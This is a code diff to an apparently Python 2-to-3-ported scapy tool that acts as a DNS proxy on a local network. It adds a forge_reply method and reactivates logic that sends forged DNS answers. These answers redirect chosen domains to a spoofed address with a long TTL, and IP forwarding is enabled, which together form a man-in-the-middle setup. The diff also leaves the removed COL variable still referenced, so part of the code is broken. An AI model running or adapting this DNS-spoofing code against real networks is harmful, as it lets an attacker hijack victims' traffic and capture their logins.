@@ -1,11 +1,13 @@
 #!/usr/bin/python2.7 
  
+from __future__ import print_function
 import sys, time 
 from scapy.all import * 
 from multiprocessing import Process
 import netifaces
+import DNSConf
 
-COL = '\033[93m'
+WARNING = '\033[91m'
 END = '\033[0m'
 
 class DNSproxy(Process): 
@@ -18,7 +20,7 @@ class DNSproxy(Process):
     self.mymac = netifaces.ifaddresses(self.interface)[17][0]['addr']
     self.router = params.gateway
     self.enableIpForwarding()
-    print '\033[92m[+]\tStarting DNS proxy\033[0m'
+    print ('\033[92m[+]\tStarting DNS proxy\033[0m')
 
 
   def forward_dns(self, orig_pkt):
@@ -28,33 +30,39 @@ class DNSproxy(Process):
         respPkt = IP(src = self.router, dst=orig_pkt[IP].src)/UDP(dport=orig_pkt[UDP].sport)/DNS()
         respPkt[DNS] = response[DNS]
         send(respPkt, verbose=0)
-        print COL + ' [DNS] ' + respPkt[IP].dst + ' > ' + respPkt[DNS].qd.qname + END
-
+        print (COL + ' [DNS] ' + respPkt[IP].dst + ' > ' + respPkt[DNS].qd.qname + END)
+  
+  @staticmethod
+  def forge_reply(pkt, qname, spoofed):
+        ip = IP()
+        udp = UDP()
+        ip.src = pkt[IP].dst
+        ip.dst = pkt[IP].src
+        udp.sport = pkt[UDP].dport
+        udp.dport = pkt[UDP].sport
+        qd = pkt[UDP].payload
+        dns = DNS(id = qd.id, qr = 1, qdcount = 1, ancount = 1, arcount = 1, nscount = 1, rcode = 0)
+        dns.qd = qd[DNSQR]
+        dns.an = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = spoofed)
+        dns.ns = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = spoofed)
+        dns.ar = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = spoofed)
+        return(ip/udp/dns)
+  
   def call(self, pkt):
-    print "DNS CALLED"
-    return {'meth': 0}    
-    '''
-        if (
-            pkt.haslayer(DNS) and
-            DNS in pkt and
-            pkt[DNS].opcode == 0 and
-            pkt[DNS].ancount == 0 and
-            pkt[IP].src != self.myip
-        ):
             spoofed = self.conf.getIPFromDomain(pkt[DNS].qd.qname)
-            self.counter += 1
+            dns = pkt[UDP].payload
+            qname = dns[DNSQR].qname
+            print ('DNS ' + qname + " / ", end="")    
             if spoofed:
-                spfResp = IP(dst=pkt[IP].src, src = self.router)\
-                    /UDP(dport=pkt[UDP].sport, sport=53)\
-                    /DNS(id=pkt[DNS].id,  qr=1, an=DNSRR(rrname=pkt[DNS].qd.qname,ttl=10, rdata=spoofed)\
-                    /DNSRR(rrname=pkt[DNS].qd.qname,rdata=spoofed))
-                send(spfResp, verbose=0)
-                print COL + ' [DNS] ' + spfResp[IP].dst + ' > ' + spfResp[DNS].an.rrname + ':' + spfResp[DNS].an.rdata + '\033[91m spoofed \033[0m'
+                print(WARNING + 'spoofed to ' + spoofed + END, end="")
+                send (self.forge_reply(pkt, qname, spoofed), verbose = 0) 
+                return {'meth': 2}
             else:
-                return self.forward_dns(pkt)
-    '''
+                print('forward', end="")
+                return {'meth': 0}
+  
   def stop(self): 
-    print '\033[94m[-]\tStopping DNS proxy\033[0m'
+    print ('\033[94m[-]\tStopping DNS proxy\033[0m')
 
   def enableIpForwarding(self):
     ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
